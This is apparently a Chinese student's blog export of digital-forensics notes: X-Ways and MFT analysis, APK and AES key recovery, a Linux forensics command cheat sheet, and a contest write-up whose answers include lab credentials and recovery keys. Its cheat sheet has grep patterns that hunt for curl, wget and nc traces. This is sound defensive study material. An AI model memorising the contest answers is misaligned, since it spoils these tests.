右键属性\n![alt text](/img/2024美亚杯个人资格赛wp_image-99.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-98.png)\n\n\n## 特殊属性\n### 已删除的文件的运行列表(Run List)的运行偏移量(Run Offset)数量\n- MFT通常指NTFS文件系统中的主文件表\n- 💻 从X-Ways Forensics导出MFT的步骤\n  - 获取MFT文件：在X-Ways中加载证据文件（如磁盘映像）后，MFT通常作为$MFT系统文件存在。\n  - 通过浏览文件系统 找到根目录下的$MFT（需开启显示系统/隐藏文件）。\n  - 导出MFT：右键点击$MFT文件，选择 导出（Export）或 另存为（Save As），将其保存到指定位置。\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-76.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-75.png)\n### 已删除文件的第一个运行的十六进制值(低端字节序 Little-Endian)\n- 小端序需要将文件中看到的内容(大端序)按字节逆序.\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-78.png)\n- 4C 3F 0D B5 22\n### 已删除文件的第一个运行偏移量(Run Offset)\n![alt text](/img/2024美亚杯个人资格赛wp_image-82.png)\n![alt text](/img/2024美亚杯个人资格赛wp_image-84.png)\n### 已删除的文件的第一个运行的簇运行长度(Run Length)\n![alt text](/img/2024美亚杯个人资格赛wp_image-83.png)\n- 3509\n### 分区格式(Partition)\n- Xways直接看，火眼用来对应盘符和分区号\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-96.png)\n\n## app\n### 短信相关搜索SMS（一般英文名）\n### 雷电APP分析-Frida脚本-SQLite数据库\n### 汇编\n- nop：no operation\n- jne：jump if not equal\n- cmp：compare\n- mov：将一个数据从源地址传送到目标地址(移动/赋值)\n  - MOV AX,[SI]，作用是将寄存器SI的内容A当做地址看待，将地址为A处的内容传送给AX；\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-118.png)\n- 俩都是test（按位与计算）然后JZ，JNZ跳转\n\n![alt text](/img/2024美亚杯个人资格赛wp_image-119.png)\n### 基址\n- (~~把 IDA View 拉到最上面可以看到~~不行得用die-高级选项)\n![alt text](/img/2024美亚杯个人资格赛wp_image-95.png)\n### 应用包名\n- jadx反编译，查看AndroidManifest.xml，package的值就是包名\n- 雷电直出\n### 封装服务商的应用唯一标识（APPID）\n- jadx直接搜应用包名好了\n![alt text](/img/电子取证常识笔记_image-2.png)\n- 雷电直出-第三方服务-调证值\n![alt text](/img/第三届长安杯笔记_2-3.png)\n### 安卓权限中英文对应\n[网上找到的对应关系表，在images文件夹存储文件名为：安卓权限中英文对应表.jpeg](https://www.cnblogs.com/linn/p/4046180.html)\n### AES解密\n#### 【25平航-27】分析倩倩的手机检材,手机内Puzzle_Game拼图程序拼图APK中的Flag1是什么\n![alt text](/img/平航杯_p-1.png)\n![alt text](/img/平航杯_p-2.png)\n- 在Java中，Byte.MAX_VALUE 是 127，Byte.MIN_VALUE = -128\n- 密码：两种方法\n```python\nfrom Crypto.Cipher import AES\nfrom Crypto.Util.Padding import unpad\n\nMAGIC_NUMBERS = [113, 99, 92, 106, 89, 98, 54, 113, 104, 89, 117, 100, 113, 127, 124, 89]\nkey_bytes = bytearray(len(MAGIC_NUMBERS))\nfor i in range(len(MAGIC_NUMBERS)):\n    key_bytes[i] = MAGIC_NUMBERS[i] ^ 6\nprint(bytes(key_bytes))\n# >>> b'weZl_d0wn_sbwyz_'\n```\n![alt text](/img/平航杯_p-3.png)\n- 密文其实是在下面的 hexStringToByteArray 方法中（理解不了一点伪C代码。。可能这位置靠猜？\n\n![alt text](/img/平航杯_p-4.png)\n- 判断AES使用的是ECB模式\n  - 如果代码中没有指定模式，通常是ECB\n  - 如果是CBC模式，通常会有IV参数\n```伪c\nbyte[] decrypted = decryptAESBlock(cipherBytes, expandedKey, iv);\n```\n### sojson.v4解密——[来源](https://www.htmlbk.com/web/2541.html)\n- 复制到浏览器控制台（或者node环境或者直接丢vs里面运行也行），按下回车键确认\n\n![alt text](/img/电子取证常识笔记_image-3.png)\n- 点击箭头所示位置跳转到定义，解密成功\n\n## 换脸模型\n### 配置文件搜.json\n\n## neo4j\n### 存放数据的数据库的名称\n- data/databases/graph.db\n### 启动控制台\n- neo4j.bat console\n- http://localhost:7474/","tags":["电子取证"],"categories":["知识点笔记"]},{"title":"解决GitHub开启2FA双重身份验证","url":"/2025/10/25/解决GitHub开启2FA双重身份验证/","content":"- [参考](https://zhuanlan.zhihu.com/p/4456378990)\n- [最后解决方案](https://mp.weixin.qq.com/s/IZrUYvd32ycKFwmuNwrlwQ)","tags":["github"]},{"title":"linux命令","url":"/2025/10/23/linux命令/","content":"**取证注意事项**\n- 优先只读访问：对磁盘镜像或分区使用只读挂载（示例见“磁盘与镜像”）\n- 保持时间一致：设置统一时区和本地化避免输出差异，例如 `TZ=UTC LC_ALL=C`\n- 先校验后操作：所有采集文件和镜像务必做哈希校验保存（见“哈希与完整性”）\n\n---\n\n## 常用命令：【kali】进入退出root命令\n设置root密码：\n```\nsudo passwd root\n```\n进入root：\n```\nsu root\n```\n退出root：\n```\nsu 用户名\n```\n\n## 文件与元数据\n\n- `pwd`\n  - 作用：明确当前工作目录，记录操作上下文\n  - 示例：``pwd``\n\n- `ls`\n  - 作用：浏览目录与隐藏文件，关注时间戳、权限、所有者\n  - 示例：``ls -al --time-style=full-iso``\n\n- `stat`\n  - 作用：查看文件详细时间戳（atime/mtime/ctime/birth）、权限、大小\n  - 示例：``stat -c '%n %s bytes | atime:%x mtime:%y ctime:%z' /path/to/file``\n\n- `file`\n  - 作用：识别文件类型与魔术字，用于发现伪装扩展名或嵌套数据\n  - 示例：``file suspicious.bin``\n\n- `find`\n  - 作用：全盘检索、时间线筛选、权限异常扫描（如 SUID）\n  - 示例：``find / -xdev -type f -newermt '2025-10-20'``  \n    ``find / -xdev -perm -4000 -type f -ls``\n\n- `grep`\n  - 作用：模式匹配检索关键字、IOC、可疑路径或命令痕迹\n  - 示例：``grep -R --line-number --binary-files=without-match -i 'curl|wget|nc' /etc /var /home``\n\n---\n\n## 内容提取与十六进制\n\n- `strings`\n  - 作用：从二进制中抽取 ASCII/Unicode 字符串，快速发现域名、路径、密钥\n  - 示例：``strings -n 8 sample.bin | grep -i 'http\\|token\\|passwd'``\n\n- `xxd` / `hexdump`\n  - 作用：十六进制查看、偏移定位、签名验证\n  - 示例：``xxd -g 1 -l 512 disk.img``  \n    ``hexdump -C suspicious.dat | head``\n\n- `cat` / `less` / `head` / `tail`\n  - 作用：查看文本与日志，`tail -f`用于实时监控\n  - 示例：``less /var/log/auth.log``  \n    ``tail -n 200 /var/log/syslog``\n\n- `wc` / `sort` / `uniq` / `cut`\n  - 作用：日志与列表的统计、去重与字段裁剪，辅助分析大批量条目\n  - 示例：``cut -d' ' -f1 ip_list.txt | sort | uniq -c | sort -nr``\n\n- `diff`\n  - 作用：比较配置或文件差异，确认未授权变更\n  - 示例：``diff -u /etc/ssh/sshd_config /mnt/baseline/sshd_config``\n\n---\n\n## 日志与账户活动\n\n- `journalctl`\n  - 作用：systemd 日志查询，按时间与单元过滤\n  - 示例：``journalctl --since '2025-10-20' --until '2025-10-23' -u ssh``\n\n- 常见日志路径\n  - 作用：定位系统与安全日志（发行版有差异）\n  - 示例：``/var/log/auth.log``  \n    ``/var/log/secure``  \n    ``/var/log/syslog``  \n    ``/var/log/messages``\n\n- `last` / `lastlog` / `who` / `w`\n  - 作用：登录历史、当前在线用户、会话活动\n  - 示例：``last -F | head``  \n    ``lastlog``  \n    ``w``\n\n- `history`\n  - 作用：Shell 历史命令（注意可能被清理或伪造）\n  - 示例：``cat ~/.bash_history``\n\n---\n\n## 进程与网络\n\n- `ps` / `top` / `htop`\n  - 作用：进程枚举、资源占用、可疑子进程分析\n  - 示例：``ps aux --sort=-%cpu | head``\n\n- `lsof`\n  - 作用：列出进程打开的文件/端口，确认数据外泄或持久化文件句柄\n  - 示例：``lsof -i -P -n``  \n    ``lsof +L1``（查找已删除但仍被占用的文件）\n\n- `ss` / `netstat`\n  - 作用：网络连接与监听端口，识别可疑外联\n  - 示例：``ss -tulpen``  \n    ``netstat -ano``（旧系统）\n\n- `ip` / `ifconfig`\n  - 作用：网卡与地址信息，检查异常路由或配置\n  - 示例：``ip addr``  \n    ``ip route``\n\n- `iptables` / `nft`\n  - 作用：防火墙规则检查，识别临时后门转发\n  - 示例：``iptables -L -n -v``  \n    ``nft list ruleset``\n\n---\n\n## 磁盘与镜像（保全证据）\n\n- `dd`\n  - 作用：位复制创建磁盘/分区镜像，保全原始证据\n  - 示例：``dd if=/dev/sda of=/evidence/disk.img bs=4M conv=noerror,sync status=progress``\n\n- `dcfldd` / `ddrescue`（如已安装）\n  - 作用：更适合取证的哈希与错误处理、坏盘救援\n  - 示例：``ddrescue -f -n /dev/sda /evidence/disk.img /evidence/mapfile``\n\n- 只读挂载镜像\n  - 作用：避免污染证据，便于浏览文件系统\n  - 示例：``mount -o ro,loop,noexec,nodev,nosuid disk.img /mnt/evidence``\n\n- 分区与块设备\n  - 作用：识别设备与分区布局\n  - 示例：``lsblk -f``  \n    ``blkid``  \n    ``fdisk -l``\n\n---\n\n## 哈希与完整性\n\n- `md5sum` / `sha1sum` / `sha256sum`\n  - 作用：生成与核对哈希，保证采集与分析文件的完整性\n  - 示例：``sha256sum /evidence/disk.img > /evidence/disk.img.sha256``  \n    ``sha256sum -c /evidence/disk.img.sha256``\n\n- `shasum`\n  - 作用：多种哈希摘要接口（依发行版）\n  - 示例：``shasum -a 512 file.bin``\n\n---\n\n## 权限与持久化\n\n- `chmod` / `chown` / `chgrp`\n  - 作用：审查或修正权限（取证时通常只读，不建议修改现场）\n  - 示例：``ls -l /etc/cron.d`` 检查权限异常\n\n- SUID/SGID 检查\n  - 作用：查找可能被滥用的提权二进制\n  - 示例：``find / -xdev -perm -4000 -type f -ls``  \n    ``find / -xdev -perm -2000 -type f -ls``\n\n- Cron 与 systemd 持久化\n  - 作用：发现后门任务或自启动服务\n  - 示例：``ls -al /etc/cron.* /var/spool/cron``  \n    ``ls -al /etc/systemd/system``  \n    ``systemctl list-timers``\n\n- SSH 授权与密钥\n  - 作用：确认未授权公钥或配置变更\n  - 示例：``cat /root/.ssh/authorized_keys``  \n    ``grep -R 'PermitRootLogin' /etc/ssh/sshd_config``\n\n---\n\n## 系统信息与环境\n\n- `uname` / `hostnamectl`\n  - 作用：系统内核、主机名、平台指纹\n  - 示例：``uname -a``  \n    ``hostnamectl``\n\n- `date`\n  - 作用：确认系统时间与时区（建议统一为 UTC）\n  - 示例：``TZ=UTC date -Iseconds``\n\n- `which` / `whereis` / `locate`\n  - 作用：定位可执行文件与资源路径，发现替换或影子副本\n  - 示例：``which ssh``  \n    ``whereis python``  \n    ``updatedb && locate suspicious``\n\n- `df` / `du`\n  - 作用：磁盘使用与异常增长定位\n  - 示例：``df -h``  \n    ``du -h -d1 /var | sort -hr | head``\n\n---\n\n## 压缩与归档\n\n- `tar` / `gzip` / `bzip2` / `xz`\n  - 作用：打包证据与日志，保持目录结构与时间戳（注意只读源）\n  - 示例：``tar -c --numeric-owner --xattrs --acls -zf logs.tar.gz /var/log``\n\n- `zip` / `7z`（如已安装）\n  - 作用：跨平台归档与加密\n  - 示例：``7z a -t7z -mhe=on -p'StrongPass' evidence.7z /evidence``\n\n---\n\n## 文本处理（现场快速分析）\n\n- `awk`\n  - 作用：结构化提取字段、做轻量聚合\n  - 示例：``awk '{print $1}' /var/log/auth.log | sort | uniq -c | sort -nr``\n\n- `sed`\n  - 作用：行级替换与过滤，清洗日志内容\n  - 示例：``sed -n 's/Failed password/FAILED/p' /var/log/auth.log``\n\n---\n\n## 证据传输与记录\n\n- `scp` / `rsync`\n  - 作用：安全传输采集材料，与校验结合\n  - 示例：``rsync -av --progress /evidence user@host:/secure/evidence``\n\n- 命令输出记录\n  - 作用：保存取证过程与链路，便于复核\n  - 示例：``script -t 2>timing.log -a session.log``（记录交互会话）\n\n---\n\n## 快速清单（可直接复制执行的实用片段）\n\n- 只读查看系统关键信息\n```\nTZ=UTC LC_ALL=C uname -a\nTZ=UTC LC_ALL=C date -Iseconds\nls -al --time-style=full-iso /etc /var/log /home\n```\n\n- 登录与可疑命令痕迹\n```\nlast -F | head\ncat ~/.bash_history | tail -n 50\ngrep -R -n -i 'curl\\|wget\\|nc\\|ssh' /etc /var /home\n```\n\n- 网络与进程基线\n```\nss -tulpen\nps aux --sort=-%cpu | head\nlsof -i -P -n\n```\n\n- SUID 与持久化检查\n```\nfind / -xdev -perm -4000 -type f -ls\nls -al /etc/cron.* /var/spool/cron\nls -al /etc/systemd/system\n```\n\n- 日志与关键信息提取\n```\njournalctl --since '2025-10-20' --until '2025-10-23' -u ssh\ntail -n 200 /var/log/auth.log\nawk '{print $1}' /var/log/auth.log | sort | uniq -c | sort -nr\n```\n\n- 镜像保全与校验\n```\ndd if=/dev/sda of=/evidence/disk.img bs=4M conv=noerror,sync status=progress\nsha256sum /evidence/disk.img > /evidence/disk.img.sha256\nmount -o ro,loop,noexec,nodev,nosuid /evidence/disk.img /mnt/evidence\n```\n\n---\n        \n## Linux 忘记密码解决方法\n![alt text](/img/linux命令_image.png)\n## Linux 文件与目录管理\n![alt text](/img/linux命令_image.png)\n"},{"title":"SPC新生赛即美亚杯选拔赛","url":"/2025/10/23/SPC新生赛即美亚杯选拔赛/","content":"## 致谢\n- 感谢cty学姐和dh学长的帮助！！感谢xc和sq学长的wp！！\n- 拿到了蛮好的成绩嘿嘿嘿开心，但也要认真复盘ヽ( ^ω^ ゞ )\n> 题目来源：某省刑侦个⼈\n## 手机取证\n### 6.【填空题】分析嫌疑人的手机，应用“备忘录记事”中记录了多少年龄小于30岁的人员信息？（答案格式：123）\n正确答案：\n4\n分值：1分\n- 火眼 耗时任务 其他应用 这题没用\n- 火眼-文件-直接找包名sql文件\n  - 注意有两页哦\n- X-ways 方法同火眼\n  - 注意文件打开按钮按下面那个\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-1.png)\n  - 编码调整\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-2.png)\n\n### 8.【单选题】分析嫌疑人的手机，嫌疑人使用文档扫描软件扫描的文件内容是什么？（ ）\nA. 提成分红记录\nB. 诈骗业绩指标\nC. 伪装身份话术\nD. 人员名单\n【正确答案】C. 伪装身份话术\n分值：1分\n- 火眼-文件-直接找包名文件夹内-temp图片\n- X-way同\n\n### 9.【填空题】分析嫌疑人的手机，嫌疑人使用的名称为“薄荷记账”的记账软件共记录了多少笔交易？（答案格式：123）\n正确答案：\n13\n分值：1分\n- X-ways\n  - 递归操作：一般在操作栏左侧选中你需要的文件右键，就把树状结构拍成一个平面\n  - 打开文件最好解压缩后打开文件夹，不然可能解压错误\n[保密部分](/2025/10/27/SPC新生赛即美亚杯选拔赛保密部分)\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-3.png)\n\n### 10.【填空题】分析嫌疑人的手机，该记账软件中关于诈骗提成分红的收入明细一共多少钱？（答案格式：123）\n正确答案：\n3281\n分值：1分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-4.png)\n## 计算机取证\n### 4.【填空题】分析嫌疑人的电脑，其电脑BitLocker加密分区的48位恢复密钥的后六位是多少？（答案格式：123456）\n正确答案：\n200189\n分值：2分\n- 查找方式：\n  - 1 明文 2 内存（mem后缀）\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-6.png)\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-7.png)\n- 170258-643148-669911-174548-088726-299772-219439-200189\n### 7.【填空题】分析嫌疑人的电脑，嫌疑人使用的苹果手机序列号是多少？（答案格式：ABCD1234）\n正确答案：\nC8PZFDJXN741\n分值：2分\n- plist后缀文件记录苹果基础信息\n- plist editor/vscode加扩展后看，搜serial\n- C8PZFDJXN741\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-8.png)\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-45.png)\n- 常见苹果备份文件名称：Info.plist、设备备份文件（Manifest.plist）、Info.plist\n### 8.【填空题】分析嫌疑人的电脑，嫌疑人曾使用的苹果手机备份四位数字密码是多少？（答案格式：1234）\n正确答案：\n0122\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-46.png)\n### 9.【填空题】分析嫌疑人的电脑，嫌疑人使用的以太坊钱包名称是什么？（答案格式：AbcDe）\n正确答案：\nMetaMask\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-9.png)\n### 10.【填空题】分析嫌疑人的电脑，嫌疑人使用的以太坊钱包版本是多少？（答案格式：26.16.0）\n正确答案：\n12.13.0\n分值：2分\n### 11.【填空题】分析嫌疑人的电脑，嫌疑人的以太坊钱包私钥助记词第4个单词是什么？（答案格式：以实际为准）\n正确答案：\ncloud\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-11.png)\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-10.png)\n### 12.【填空题】分析嫌疑人的电脑，嫌疑人的Skype账号是多少？（答案格式：以实际为准）\n正确答案：\nlive:.cid.d2bb7d5a13237f1d\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-12.png)\n### 14.【填空题】分析嫌疑人的电脑，嫌疑人电脑中安装的VPN软件名称是什么？（答案格式：Abc VPN）\n正确答案：\nAny VPN\n分值：2分\n- 注意开始界面啊！！有可能在中间哦 \n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-5.png)\n### 16.【填空题】分析嫌疑人的电脑，该流量包开始抓取第一个分组的时间是什么？（答案格式：1900/01/01 01:00:00）\n正确答案：\n2025/04/03 12:47:18\n分值：2分\n- 文件：1仿真打开wireshark找到；2X-ways搜（复刻失败）3火眼搜（成功）\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-13.png)\n- 暂时不理解这地方怎么搞先记下来\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-14.png)\n- 要注意UTC哦\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-15.png)\n- **其实直接出：**\n  - 捕获文件属性Ctrl+Shift+ALT+C，直接出答案\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-42.png)\n### 17.【单选题】分析嫌疑人的电脑，抓取该流量包的总时长是？\nA. 00:02:14\nB. 00:08:25\nC. 00:18:25\nD. 00:29:31\n【正确答案】A. 00:02:14\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-15.png)\n- 最后一个包\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-16.png)\n- **其实直接出：**\n  - 捕获文件属性Ctrl+Shift+ALT+C，直接出答案\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-42.png)\n### 18.【单选题】分析嫌疑人的电脑，该流量包中IPV4地址为3.24.46.4的占比是多少？\nA. 96.69%\nB. 97.36%\nC. 98.47%\nD. 99.74%\n【正确答案】D. 99.74%\n分值：2分\n- 直接出\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-43.png)\n- 用python脚本解决（蠢方法）\n```python\n#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n'''\n只输出指定协议或地址的占比：\n- 输入 pcap/pcapng 路径、协议名（如 TCP/UDP/HTTP/DNS/ICMP）、可选协议地址（仅 IPv4）\n- 仅打印一个数值：满足条件的占比（按字节占比），四舍五入到 4 位小数\n用法示例：\npython analyze_pcap.py \"E:/trace/example.pcapng\" TCP\npython analyze_pcap.py \"E:/trace/example.pcapng\" TCP 3.24.46.4\n'''\n\nimport sys\nfrom typing import Optional\nfrom scapy.all import rdpcap, Packet\nfrom scapy.layers.inet import IP, TCP, UDP, ICMP\nfrom scapy.layers.inet6 import IPv6\ntry:\n    from scapy.layers.http import HTTP\nexcept Exception:\n    HTTP = None  # HTTP 层可能不在所有版本中提供\ntry:\n    from scapy.layers.dns import DNS\nexcept Exception:\n    DNS = None\n\nPROTOCOL_MAP = {\n    \"TCP\": TCP,\n    \"UDP\": UDP,\n    \"ICMP\": ICMP,\n    \"IP\": IP,\n    \"IPv6\": IPv6,\n}\nif HTTP is not None:\n    PROTOCOL_MAP[\"HTTP\"] = HTTP\nif DNS is not None:\n    PROTOCOL_MAP[\"DNS\"] = DNS\n\n\ndef match_protocol(pkt: Packet, proto_name: str) -> bool:\n    if not proto_name:\n        return True\n    name = proto_name.upper()\n    if name in (\"ANY\", \"ALL\", \"*\"):\n        return True\n    # IP: 同时匹配 IPv4 与 IPv6\n    if name == \"IP\":\n        return pkt.haslayer(IP) or pkt.haslayer(IPv6)\n    # IPv4 别名仅匹配 IPv4\n    if name in (\"IPV4\", \"IP4\"):\n        return pkt.haslayer(IP)\n    # IPv6 仅匹配 IPv6\n    if name in (\"IPV6\", \"IP6\"):\n        return pkt.haslayer(IPv6)\n    layer = PROTOCOL_MAP.get(name)\n    if layer is None:\n        return False\n    return pkt.haslayer(layer)\n\n\ndef match_address(pkt: Packet, addr: Optional[str]) -> bool:\n    if not addr:\n        return True\n    # 既支持 IPv4 又支持 IPv6\n    if pkt.haslayer(IP):\n        ip = pkt[IP]\n        return ip.src == addr or ip.dst == addr\n    if pkt.haslayer(IPv6):\n        ip6 = pkt[IPv6]\n        return ip6.src == addr or ip6.dst == addr\n    return False\n\n\ndef packet_len(pkt: Packet) -> int:\n    try:\n        return len(bytes(pkt))\n    except Exception:\n        # 回退：若无法序列化，尝试最外层 len\n        return len(pkt)\n\n\ndef _detect_addr_family(addr: Optional[str]) -> Optional[str]:\n    if not addr:\n        return None\n    if \":\" in addr:\n        return \"ipv6\"\n    if \".\" in addr:\n        return \"ipv4\"\n    return None\n\n\ndef compute_ratio(pcap_path: str, proto_name: str, addr: Optional[str]) -> float:\n    packets = rdpcap(pcap_path)\n    family = _detect_addr_family(addr)\n    total_pkts = 0\n    matched_pkts = 0\n    for pkt in packets:\n        # 如果提供了地址，则仅统计对应地址族的 IP 包；否则统计 IPv4+IPv6\n        if family == \"ipv4\":\n            if not pkt.haslayer(IP):\n                continue\n        elif family == \"ipv6\":\n            if not pkt.haslayer(IPv6):\n                continue\n        else:\n            if not (pkt.haslayer(IP) or pkt.haslayer(IPv6)):\n                continue\n        total_pkts += 1\n        if match_protocol(pkt, proto_name) and match_address(pkt, addr):\n            matched_pkts += 1\n    if total_pkts == 0:\n        return 0.0\n    return matched_pkts / total_pkts\n\n\ndef main():\n    if len(sys.argv) >= 3:\n        pcap_path = sys.argv[1]\n        proto_name = sys.argv[2]\n        addr = sys.argv[3] if len(sys.argv) >= 4 else None\n    else:\n        try:\n            pcap_path = input(\"请输入 pcap 路径: \").strip()\n            proto_name = input(\"请输入协议名（IP/TCP/UDP/ICMP/HTTP/DNS；支持 IPv4/IPV4/IP4/IPv6；ANY/ALL/* 或留空表示不限制；统计口径：若提供地址则按其地址族（IPv4/IPv6）包数占比，否则 IPv4+IPv6）: \").strip()\n            addr_in = input(\"可选地址(IPv4/IPv6，留空则不限制): \").strip()\n        except EOFError:\n            print(\"Usage: python analyze_pcap.py <pcap_path> <protocol> [address]\", file=sys.stderr)\n            sys.exit(1)\n        addr = addr_in if addr_in else None\n    ratio = compute_ratio(pcap_path, proto_name, addr)\n    # 仅输出一个数值，占比，四舍五入 4 位小数\n    print(f\"{ratio:.4f}\")\n\nif __name__ == \"__main__\":\n    main()\n\n```\n\n### 19.【填空题】分析嫌疑人的电脑，嫌疑人使用的AI换脸软件中，当前调用的onnx（Open Neural Network Exchange，开放神经网络交换）格式的模型文件有几个？（答案格式：1）\n正确答案：\n5\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-17.png)\n- 详细思路：\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-47.png)\n### 20.【填空题】分析嫌疑人的电脑，嫌疑人注册登录的数字天堂开发工具的账号是什么？（答案格式：aaa@bbb.ccc）\n正确答案：\nwanggui0411@outlook.com\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-19.png)\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-18.png)\n### 21.【填空题】分析嫌疑人电脑里的APK前端源码，如办案人员需要对该APK进行调证，请问调证值是多少？（答案格式：英文大写）\n正确答案：\nH5AAA8907\n分值：2分\n- id一般是调证值\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-20.png)\n### 24.【填空题】分析嫌疑人电脑里的APK前端源码，该APK中的API调用的API Server是多少？（答案格式：以实际为准，如http://www.qasz.com/abc/def/）\n正确答案：\nhttp://www.tianxinbobo.com/csapi/uploads/\n分值：2分\n- everything搜前端，X-ways打开右键“同步搜索”，apiserver，搜到index文件\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-21.png)\n- 回虚拟机找\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-22.png)\n## 服务器取证\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-23.png)\n- 加外网卡操作：\n  - 虚拟机-设置-加网络适配器\n  - DHCP要3-254\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-24.png)\n- 加网卡失败备用操作：（来自xc学长）\n  - 删除现有配置(连接会断开!)`sudo nmcli con delete \"ens33'`\n  - 重建默认配置`sudo nmcli con add type ethernet con-` `name ens33 ifname ens33 autoconnect yes`\n  - 重启服务`sudo systemctl restart NetworkManager`\n- 连宝塔：\n  - finalshell\n    - ip a\n    - ssh连接服务状态端口查询命令：\n```cmd\nsystemctl status sshd\n```\n  - bt 14\n### 2.【填空题】涉案服务器A的ssh的端口号是多少？\n正确答案：\n222\n分值：2分\n- ssh连接服务状态端口查询命令：\n```cmd\nsystemctl status sshd\n```\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-25.png)\n- 端口查询命令：\n```\nss -tunlp | grep ssh\n```\n### 3.【填空题】分析服务器镜像A，涉案服务器的ip地址是什么？(答案格式：123.123.123.123）\n正确答案：\n10.0.0.11\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-27.png)\n### 5.【填空题】涉案服务器A中mysql的端口号是多少？（答案格式：123）\n正确答案：\n3340\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-26.png)\n#### 连接mysql\n  - 宝塔拿到数据库密码：b21829007afcc1a3\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-28.png)\n  - navicat\n    - ssh要填\n    - 常规填mysql数据\n### 7.【填空题】涉案服务器A中宝塔面板最早保存的第一次登陆时的ip地址和端口号是什么？（答案格式：123.456.789.123:456）\n正确答案：\n192.168.136.1:60332\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-29.png)\n### 8.【填空题】涉案服务器A前端登录网址是什么？（答案格式：http://xxx.xxx.xxx.xxx/../....）\n正确答案：\nhttp://10.0.0.11/mobile/login.html\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-30.png)\n- 某个日志。。但检材被我删了。。so随意跳过哈哈哈ε=ε=ヾ(;ﾟдﾟ)/\n- 收获sq学长wp\n  - 找日志（上面那个网站）.log\n  - 火眼打开搜login\n### 9.【填空题】涉案服务器A平台共成功充值了多少金额？（答案格式：12340.56）\n正确答案：\n30920984.57\n分值：2分\n- 这⾥筛选注意，⼀个是系统充值和银⾏⼊款，还有要注意status，应该为1\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-32.png)\n### 10.【填空题】根据涉案服务器A回答，肖一帆一共发展了多少个用户作为直接下线？（答案格式：123）\n正确答案：\n7\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-33.png)\n### 11.【填空题】根据涉案服务器A中VIP6等级的积分限制是多少？（答案格式：123）\n正确答案：\n1000000\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-34.png)\n\n### 15.【填空题】根据涉案服务器A分析阿里云接口API的银行卡接口地址是多少？（答案格式：以实际为准）\n正确答案：\nhttps://market.aliyun.com/products/56928004/cmapi012976.html\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-35.png)\n\n### 16.【填空题】分析嫌疑人的云服务器B，涉案服务器中Java网站源码jar包名称是？（答案格式：包含后缀）\n正确答案：\nbh-wms-0.0.1-SNAPSHOT.jar\n分值：2分\n- 服务器B输入```find / -name *.jar```，找不到可以把输出结果变成文档```find / -name *.jar > jar.txt```，最后找到```/project/bh-wms-0.0.1-SNAPSHOT.jar```\n- 原因：bh开头的就是网站源码（而且这个文件本身就很大）\n\n### 17.【填空题】分析嫌疑人的云服务器B，涉案Java网站数据库root账号的密码是多少？（答案格式：Abc@123456）\n正确答案：\nTuojie@666\n分值：2分\n- 16题文件恢复出来放jadx\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-37.png)\n### 18.【填空题】分析嫌疑人的云服务器B，涉案Java网站的端口是多少？（答案示例：3123）\n正确答案：\n8080\n分值：2分\n- 16题文件恢复出来放jadx17题同一页有\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_d3e34b1ec291074221a4af21b8adae37.jpg)\n- ```java -jar bh-wms-0.0.1-SNAPSHOT.jar```，finalshell连接```ss -tunlp```多出来一个8080端口\n\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-38.png)\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-39.png)\n### 19.【填空题】分析嫌疑人的云服务器B，该网站后台保留的登录账号的用户昵称为？（答案格式：老李）\n正确答案：\n三弟\n分值：2分\n![alt text](/img/SPC新生赛即美亚杯选拔赛_image-40.png)\n### 20.【填空题】分析嫌疑人的云服务器B，位于南京市江宁区的货物仓库存有多少个产品？（答案格式：123）\n正确答案：\n21626\n分值：2分\n![alt 